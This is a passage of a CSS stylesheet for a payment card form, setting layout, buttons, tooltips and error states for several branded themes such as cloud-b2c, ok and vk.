	background: #f0f0f0;
	-webkit-box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04);
	box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04)
}

.pay-card_type_cloud-b2c .credit-card-form__card_position_back {
	margin-top: -181px;
	right: -106px;
	background: #c7c7c7;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_cloud-b2c .credit-card-form__card_position_back:before {
	height: 35px
}

.pay-card_type_cloud-b2c .payment-systems-icons {
	top: -35px
}

.pay-card_type_cloud-b2c .credit-card-form__submit {
	margin-top: 0;
	text-align: left;
	border-top: 1px solid #e0e0e0;
	padding: 25px 0 0
}

.pay-card_type_cloud-b2c .credit-card-form__title {
	text-transform: none;
	font-size: 13px;
	font-weight: 700;
	line-height: 14px
}

.pay-card_type_cloud-b2c .credit-card-form__title_type_expiration-date {
	top: 135px
}

.pay-card_type_cloud-b2c .credit-card-form__label_type_cvv .credit-card-form__title {
	margin-top: 5px;
	margin-bottom: 5px
}

.pay-card_type_cloud-b2c .credit-card-form__error-text,
.pay-card_type_cloud-b2c .credit-card-form__label_type_cvv .credit-card-form__error-text {
	position: static;
	display: none;
	font-size: 13px
}

.pay-card_type_cloud-b2c .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 0;
	border: 1px solid #f10
}

.pay-card_type_cloud-b2c .credit-card-form__input {
	padding-top: 6px;
	padding-bottom: 6px;
	border: 1px solid rgba(0, 0, 0, .12);
	border-radius: 2px;
	background: #fff;
	font-size: 15px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_cloud-b2c .credit-card-form__input:disabled {
	background: #f7f7f7;
	color: #000;
	opacity: 1;
	-webkit-text-fill-color: #000
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_card-number .credit-card-form__input {
	letter-spacing: .1em
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount {
	position: relative;
	margin: 0 auto 25px
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount .credit-card-form__title {
	margin: 0 0 5px
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount .credit-card-form__input {
	padding-top: 7px;
	padding-bottom: 7px;
	font-size: 15px;
	font-weight: 400;
	text-transform: none;
	letter-spacing: normal;
	background: #fff
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount .credit-card-form__input:disabled {
	background: #f7f7f7
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount .credit-card-form__placeholder {
	position: absolute;
	right: 30px;
	top: 27px;
	color: #9a9a9a;
	text-transform: none;
	font-size: 15px;
	font-weight: 100
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_payment-amount .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info,
.pay-card_type_cloud-b2c .credit-card-form__terms {
	padding-top: 10px;
	font-size: 13px;
	line-height: 18px;
	color: #999
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info-link,
.pay-card_type_cloud-b2c .credit-card-form__terms-link {
	color: #999
}

.pay-card_type_cloud-b2c .credit-card-form__terms-link:hover {
	text-decoration: none
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_holder-name {
	display: inline-block;
	width: 160px
}

.pay-card_type_cloud-b2c .credit-card-form__label-group_type_holder-name .credit-card-form__title {
	margin: 0 0 3px
}

.pay-card_type_cloud-b2c .credit-card-form__cvv-icon,
.pay-card_type_cloud-b2c .credit-card-form__label:hover .credit-card-form__cvv-icon {
	width: 16px;
	height: 16px
}

.pay-card_type_cloud-b2c .credit-card-form__cvv-icon {
	display: block;
	margin-top: 6px;
	background: #333;
	border-radius: 8px;
	text-align: center;
	cursor: pointer
}

.pay-card_type_cloud-b2c .credit-card-form__cvv-icon:before {
	display: block;
	content: "?";
	font-size: 9px;
	color: #c7c7c7;
	line-height: 16px
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info .credit-card-form__tooltip,
.pay-card_type_cloud-b2c .credit-card-form__tooltip_type_cvv {
	left: 50%;
	margin-left: -90px;
	padding-right: 15px;
	padding-left: 15px;
	border-radius: 2px;
	-webkit-box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	font-size: 15px;
	line-height: 18px;
	color: #333
}

.pay-card_type_cloud-b2c .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-arrow,
.pay-card_type_cloud-b2c .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button,
.pay-card_type_cloud-b2c .credit-card-form__submit .button {
	color: #fff;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005ff9;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button:hover,
.pay-card_type_cloud-b2c .credit-card-form__submit .button:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005aee
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button:active,
.pay-card_type_cloud-b2c .credit-card-form__submit .button:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #0057e4
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_cloud-b2c .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_cloud-b2c .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_cloud-b2c .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #005ff9;
	color: #fff;
	cursor: default;
	opacity: .4
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button__light,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light {
	color: #333;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button__light:hover,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #ddd
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button__light:active,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #d3d3d3
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__popup .button__light.button_disabled_yes:active,
.pay-card_type_cloud-b2c .credit-card-form__popup .button__light.button_disabled_yes:hover,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light.button_disabled_yes,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light.button_disabled_yes:active,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light.button_disabled_yes:hover {
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	color: #333;
	cursor: default;
	opacity: .48
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button,
.pay-card_type_cloud-b2c .credit-card-form__popup .button__light,
.pay-card_type_cloud-b2c .credit-card-form__submit .button,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light {
	padding-left: 20px;
	padding-right: 20px;
	line-height: 30px;
	font-size: 15px;
	font-weight: 400;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_cloud-b2c .credit-card-form__submit .button {
	margin-right: 10px
}

.pay-card_type_cloud-b2c .credit-card-form__popup .button {
	margin-right: 0
}

.pay-card_type_cloud-b2c .credit-card-form__popup-footer {
	margin-bottom: 20px;
	height: auto;
	position: absolute;
	bottom: 0;
	left: 50%;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%)
}

.pay-card_type_cloud-b2c .credit-card-form__popup-body {
	height: 100%
}

.pay-card-layout_type_cloud-b2c .secure-information {
	padding-top: 10px;
	background: none
}

.pay-card-layout_type_cloud-b2c-outgoing .secure-information {
	padding-bottom: 20px
}

.pay-card-layout_type_cloud-b2c .secure-information__icon {
	display: none
}

.pay-card-layout_type_cloud-b2c .secure-information__column_position_left,
.pay-card-layout_type_cloud-b2c .secure-information__column_position_right {
	padding: 0
}

.pay-card-layout_type_cloud-b2c .protection-icons__list-item {
	margin-right: 0
}

.pay-card-layout_type_cloud-b2c .secure-information__text {
	font-size: 13px;
	line-height: 17px;
	color: #999
}

.pay-card-layout_type_cloud-b2c .secure-information__text_type_protocol {
	display: block;
	color: #10b800
}

.credit-card-form__popup_type_cloud-b2c .info-block .title {
	margin: 0 0 25px;
	font-size: 24px;
	line-height: 32px
}

.credit-card-form__popup_type_cloud-b2c .info-block .paragraph {
	font-size: 15px;
	line-height: 20px
}

.credit-card-form__popup_type_cloud-b2c .payment-info-table {
	padding: 0
}

.credit-card-form__popup_type_cloud-b2c .payment-info-table__caption {
	padding: 15px 0 10px
}

.control__select_type_cloud-b2c {
	width: auto!important;
	min-width: 0!important;
	padding-right: 10px;
	border: 0!important;
	border-radius: 0!important;
	background: #fff!important;
	font-size: 15px
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu {
	width: auto!important;
	border-radius: 2px;
	border: none;
	-webkit-box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: #fff
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li {
	position: relative;
	padding-left: 15px;
	padding-right: 15px;
	font-size: 15px;
	line-height: 32px;
	color: #333
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li.selectBox-selected a {
	background: #fff
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li a {
	height: 32px;
	line-height: 32px!important;
	cursor: pointer
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li.selectBox-hover a {
	background: #fff
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li.selectBox-hover a:before,
.control__select_type_cloud-b2c-selectBox-dropdown-menu li.selectBox-selected a:before {
	position: absolute;
	left: 7px;
	top: 0;
	font-size: 10px;
	content: "\2714"
}

.control__select_type_cloud-b2c-selectBox-dropdown-menu li:last-child {
	border-top: 1px solid #e0e0e0
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info {
	color: #9a9a9a;
	text-transform: none
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info-link {
	text-decoration: underline;
	position: relative;
	cursor: pointer
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info-link:hover {
	text-decoration: none
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info-link:hover .credit-card-form__tooltip {
	opacity: 1;
	visibility: visible
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info .credit-card-form__tooltip {
	margin-left: 0;
	top: 25px;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%);
	width: 280px;
	line-height: 1.57
}

@media (max-width:480px) {
	.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info .credit-card-form__tooltip {
		margin-left: 25px;
		left: 0
	}
}

.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info .credit-card-form__tooltip-arrow {
	right: 50%;
	top: -24px;
	-webkit-transform: translateX(50%);
	-o-transform: translateX(50%);
	transform: translateX(50%);
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #fff;
	border-width: 12px;
	margin-left: 0
}

@media (max-width:480px) {
	.pay-card-layout_type_cloud-b2c .credit-card-form__payment-amount-info .credit-card-form__tooltip-arrow {
		right: 40%
	}
}

.pay-card-layout_type_cloud-b2c .credit-card-form__submit .button {
	font-family: Roboto, Arial, sans-serif
}

.pay-card_type_aw .credit-card-form__label-group_type_add-card .credit-card-form__label,
.pay-card_type_aw .credit-card-form__terms,
.pay-card_type_aw .credit-card-form__terms-link,
.pay-card_type_aw .pay-card__card-selector,
.pay-card_type_aw .pay-card__title {
	color: #73bcdc
}

.pay-card_type_aw .credit-card-form__popup {
	background-color: #202125
}

.pay-card_type_aw .credit-card-form .button {
	border-radius: 0;
	color: #fff;
	background: #22353c
}

.pay-card_type_aw .credit-card-form .button:active,
.pay-card_type_aw .credit-card-form .button:hover {
	background: #456977
}

.pay-card_type_aw .credit-card-form .button:active {
	line-height: 34px;
	padding: 0 27px 0 29px
}

.pay-card_type_aw .credit-card-form .button_disabled_yes {
	color: #999;
	cursor: default;
	text-shadow: none;
	-webkit-box-shadow: none;
	box-shadow: none;
	background-image: none!important
}

.pay-card_type_aw .credit-card-form .button_disabled_yes,
.pay-card_type_aw .credit-card-form .button_disabled_yes:active,
.pay-card_type_aw .credit-card-form .button_disabled_yes:hover {
	border-color: #dcdcdc;
	background-color: #dddde0;
	background-image: -webkit-linear-gradient(top, #dddde0, #ccc);
	background-image: -o-linear-gradient(top, #dddde0 0, #ccc 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dddde0), to(#ccc));
	background-image: linear-gradient(180deg, #dddde0 0, #ccc)
}

.pay-card_type_aw .credit-card-form .button_disabled_yes:active,
.pay-card_type_aw .credit-card-form .button_disabled_yes:hover {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_aw .notification-block {
	background-color: #202125
}

.pay-card_type_aw .notification-block .payment-info-table__cell,
.pay-card_type_aw .notification-block .title {
	color: #999
}

.pay-card_type_aw .notification-block .payment-info-table,
.pay-card_type_aw .notification-block .payment-info-table__caption {
	background-color: hsla(0, 0%, 100%, .04)
}

.pay-card_type_ok .pay-card__row {
	padding-top: 5px
}

.pay-card_type_ok .pay-card__card-selector {
	margin-bottom: 5px;
	white-space: nowrap
}

.pay-card_type_ok .pay-card__remove-card {
	color: #eb722e
}

.pay-card_type_ok .pay-card__remove-card:hover {
	color: #b84819
}

.pay-card_type_ok .pay-card__remove-card-text {
	text-decoration: underline
}

.pay-card_type_ok .credit-card-form .credit-card-form__terms {
	padding-top: 5px;
	white-space: nowrap
}

.card-to-card.card-to-card_type_ok .card-to-card__terms-link,
.pay-card_type_ok .credit-card-form .credit-card-form__terms-link {
	color: #eb722e;
	text-decoration: none
}

.card-to-card.card-to-card_type_ok .card-to-card__terms-link:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__terms-link:hover {
	color: #b84819;
	text-decoration: underline
}

.pay-card_type_ok .credit-card-form .credit-card-form__submit {
	margin-top: 0;
	padding-top: 5px
}

.button_theme_ok,
.pay-card-layout_type_ok .credit-card-form__popup .button,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button {
	text-transform: none;
	position: relative;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	margin: 0;
	padding: 0 20px;
	min-width: 96px;
	height: 32px;
	cursor: pointer;
	white-space: nowrap;
	overflow: visible;
	border-radius: 3px;
	border: 0;
	font: 500 14px/32px arial, helvetica, sans-serif;
	color: #fff;
	outline: none;
	text-align: center;
	background: #ee8208;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

a.button_theme_ok,
a.pay-card-layout_type_ok .credit-card-form__popup .button,
a.pay-card_type_ok .credit-card-form .credit-card-form__submit .button,
span.button_theme_ok,
span.pay-card-layout_type_ok .credit-card-form__popup .button,
span.pay-card_type_ok .credit-card-form .credit-card-form__submit .button {
	display: inline-block;
	text-decoration: none
}

button.button_theme_ok,
button.pay-card-layout_type_ok .credit-card-form__popup .button,
button.pay-card_type_ok .credit-card-form .credit-card-form__submit .button,
input.button_theme_ok,
input.pay-card-layout_type_ok .credit-card-form__popup .button,
input.pay-card_type_ok .credit-card-form .credit-card-form__submit .button {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.button_theme_ok:focus,
.button_theme_ok:hover,
.pay-card-layout_type_ok .credit-card-form__popup .button:focus,
.pay-card-layout_type_ok .credit-card-form__popup .button:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:focus,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:hover {
	background-color: #ee7808;
	color: #fff;
	text-decoration: none
}

.button_theme_ok:active,
.button_theme_ok:hover,
.pay-card-layout_type_ok .credit-card-form__popup .button:active,
.pay-card-layout_type_ok .credit-card-form__popup .button:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:active,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:hover {
	outline: none
}

.button_theme_ok:active,
.pay-card-layout_type_ok .credit-card-form__popup .button:active,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:active {
	background-color: #ee6e08
}

.button_theme_ok.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__small {
	min-width: 72px;
	height: 24px;
	padding: 0 16px;
	line-height: 24px;
	font-size: 12px
}

.button_theme_ok.__sec,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec {
	line-height: 30px;
	border: 1px solid #ddd;
	color: #666;
	background-color: #f0f0f0
}

.button_theme_ok.__sec:hover,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec:hover {
	background-color: #ddd;
	border-color: #ccc
}

.button_theme_ok.__sec:active,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec:active,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec:active {
	background-color: #ccc;
	border-color: #999
}

.button_theme_ok.__sec:active,
.button_theme_ok.__sec:hover,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec:active,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec:active,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec:hover {
	outline: none
}

.button_theme_ok.__sec.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.__sec.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.__sec.__small {
	min-width: 72px;
	font-size: 12px;
	line-height: 22px
}

.button_theme_ok:focus,
.pay-card-layout_type_ok .credit-card-form__popup .button:focus,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.button_theme_ok.button_disabled_yes,
.button_theme_ok.button_disabled_yes:active,
.button_theme_ok.button_disabled_yes:focus,
.button_theme_ok.button_disabled_yes:hover,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:focus,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:focus,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:hover {
	background-color: #ee8208;
	opacity: .5;
	cursor: default
}

.button_theme_ok.button_disabled_yes.__sec,
.button_theme_ok.button_disabled_yes:active.__sec,
.button_theme_ok.button_disabled_yes:focus.__sec,
.button_theme_ok.button_disabled_yes:hover.__sec,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes.__sec,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:active.__sec,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:focus.__sec,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:hover.__sec,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes.__sec,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:active.__sec,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:focus.__sec,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:hover.__sec {
	height: 32px;
	background-color: #ddd;
	border-color: #ddd;
	color: #666
}

.button_theme_ok.button_disabled_yes.__sec.__small,
.button_theme_ok.button_disabled_yes:active.__sec.__small,
.button_theme_ok.button_disabled_yes:focus.__sec.__small,
.button_theme_ok.button_disabled_yes:hover.__sec.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes.__sec.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:active.__sec.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:focus.__sec.__small,
.pay-card-layout_type_ok .credit-card-form__popup .button.button_disabled_yes:hover.__sec.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes.__sec.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:active.__sec.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:focus.__sec.__small,
.pay-card_type_ok .credit-card-form .credit-card-form__submit .button.button_disabled_yes:hover.__sec.__small {
	height: 24px
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label .credit-card-form__title {
	font-size: 9px;
	margin-bottom: 0;
	margin-top: 0
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__input {
	font-size: 15px;
	line-height: 17px
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label-group_type_card-number {
	margin-bottom: 20px
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label-group_type_expiration-date,
.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label-group_type_holder-name {
	margin: 5px 0 0
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label-group_type_holder-name {
	float: left
}

.pay-card_type_ok .credit-card-form_holder-name-visible .credit-card-form__label-group_type_holder-name .credit-card-form__input {
	width: 150px
}

.pay-card-layout_type_ok-p2p-outgoing .pay-card {
	position: static
}

.pay-card-layout_type_ok-p2p-incoming .credit-card-form__card_position_back {
	display: none
}

.pay-card-layout_type_ok-p2p-incoming .credit-card-form__card_position_front {
	margin: 0 auto
}

.pay-card-layout_type_ok-p2p-incoming .pay-card,
.pay-card-layout_type_ok .credit-card-form__popup {
	position: static
}

.pay-card_type_c2c {
	display: inline-block
}

.pay-card_type_c2c .pay-card__title {
	text-align: left;
	padding-top: 0;
	line-height: 30px
}

.pay-card_type_vk-p2p .credit-card-form_holder-name-visible .credit-card-form__input {
	font-size: 15px;
	line-height: 17px;
	letter-spacing: 1px
}

.pay-card_type_vk-p2p .credit-card-form_holder-name-visible .credit-card-form__label-group_type_holder-name {
	float: left
}

.pay-card_type_vk-p2p .credit-card-form_holder-name-visible .credit-card-form__label-group_type_holder-name .credit-card-form__input {
	width: 166px
}

.pay-card_type_vk-p2p .credit-card-form_holder-name-visible .credit-card-form__label-group_type_card-number .credit-card-form__input {
	letter-spacing: 2px
}

.pay-card-layout_type_vk .credit-card-form__form {
	position: relative;
	padding-top: 0
}

.pay-card-layout_type_vk .credit-card-form__input {
	height: 25px;
	padding: 0 5px;
	line-height: 23px;
	border: 1px solid #c0cad5;
	background: #fff;
	font-size: 14px;
	letter-spacing: 2px;
	color: #000
}

.pay-card-layout_type_vk .credit-card-form__title {
	margin: 0 0 5px;
	font-size: 12px;
	color: #666
}

.pay-card-layout_type_vk .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card-layout_type_vk .credit-card-form__label {
	text-transform: none
}

.pay-card-layout_type_vk .credit-card-form__label .credit-card-form__error-text {
	display: none
}

.pay-card-layout_type_vk .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 1px solid #e89b88;
	background: #faeaea
}

.pay-card-layout_type_vk .credit-card-form__label_type_cvv {
	right: 35px;
	top: -24px;
	position: relative;
	z-index: 1
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv .credit-card-form__label {
	width: 63px;
	text-transform: none
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv .credit-card-form__title-link {
	color: #666;
	cursor: pointer
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_cvv .credit-card-form__title-link:hover {
	text-decoration: underline
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_card-number {
	padding-top: 4px;
	margin-bottom: 14px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card {
	position: absolute;
	left: 50%;
	top: 54px;
	margin-left: -50px;
	z-index: 2
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 12px;
	color: #666;
	letter-spacing: -.1px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_add-card .credit-card-form__input {
	margin-right: 3px;
	margin-top: 2px
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date {
	float: left
}

.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card-layout_type_vk .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0
}

.pay-card_type_vk-p2p .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 84px
}

.pay-card_type_vk-p2p .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	width: 63px;
	margin-left: 0
}

.pay-card_type_vk-p2p .payment-systems-icons {
	position: absolute;
	right: 20px;
	top: 15px
}

.pay-card_type_vk-p2p .credit-card-form_size_small .payment-systems-icon {
	margin-left: 8px
}

.pay-card-layout_type_vk .payment-systems-icon_name_mir,
.pay-card-layout_type_vk .payment-systems-icon_name_visa,
.pay-card_type_vk-p2p .payment-systems-icon_name_mir,
.pay-card_type_vk-p2p .payment-systems-icon_name_visa {
	top: 4px
}

.pay-card-layout_type_vk {
	position: relative;
	min-height: 100%;
	max-width: 480px;
	margin: 0 auto;
	padding: 25px 25px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif;
	font-size: 13px;
	color: #000
}

.pay-card-layout_type_vk .pay-card-layout__header {
	margin: 0 0 15px;
	padding: 0 0 15px;
	border-bottom: 1px solid #e7e8ec
}

.pay-card-layout_type_vk .pay-card-layout__title {
	padding: 5px 0;
	float: left;
	font-size: 18px;
	color: #000;
	letter-spacing: -.4px
}

.pay-card-layout_type_vk .pay-card-layout__logo {
	float: right
}

.pay-card-layout_type_vk .secure-information {
	margin: 0 0 15px;
	padding: 15px 0 0;
	font-size: 13px;
	border-top: 1px solid #e7e8ec;
	background: none
}

.pay-card-layout_type_vk .secure-information__column {
	padding: 0
}

.pay-card-layout_type_vk .secure-information__column_position_left {
	width: 70%
}

.pay-card-layout_type_vk .secure-information__column_position_right {
	width: 30%
}

.pay-card-layout_type_vk .secure-information__text {
	font-size: 13px;
	letter-spacing: -.1px
}

.pay-card-layout_type_vk .protection-icons__list-item:last-child {
	margin-right: 0
}

.pay-card-layout_type_vk .info-block_type_description {
	margin: 0 0 -25px;
	padding: 20px 0 0;
	color: #656565;
	border-top: 1px solid #e7e8ec
}

.pay-card-layout_type_vk .info-block_type_description .paragraph {
	margin-bottom: 25px;
	line-height: 19px;
	letter-spacing: -.1px
}

.pay-card-layout_type_vk .info-block_type_description .paragraph:last-child {
	margin-bottom: 0
}

.pay-card-layout_type_vk .info-block_type_description .link {
	color: #2a5885;
	font-weight: 700
}

.pay-card_type_vk {
	text-align: left
}

.pay-card-layout_type_vk .pay-card__row {
	padding-top: 0
}

.pay-card-layout_type_vk .pay-card__card-selector {
	width: auto;
	margin: 0
}

.pay-card-layout_type_vk .pay-card__card-selector .control-label,
.pay-card-layout_type_vk .pay-card__select-card {
	display: block
}

.pay-card-layout_type_vk .pay-card__select-card .control {
	margin-right: 0
}

.pay-card-layout_type_vk .credit-card-form__label .credit-card-form__title,
.pay-card-layout_type_vk .pay-card__select-card .control-label__text,
.pay-card-layout_type_vk .payment-form__label .payment-form__title {
	display: block;
	margin: 0 0 5px;
	font-size: 14px;
	line-height: 19px;
	color: #828282;
	letter-spacing: -.2px
}

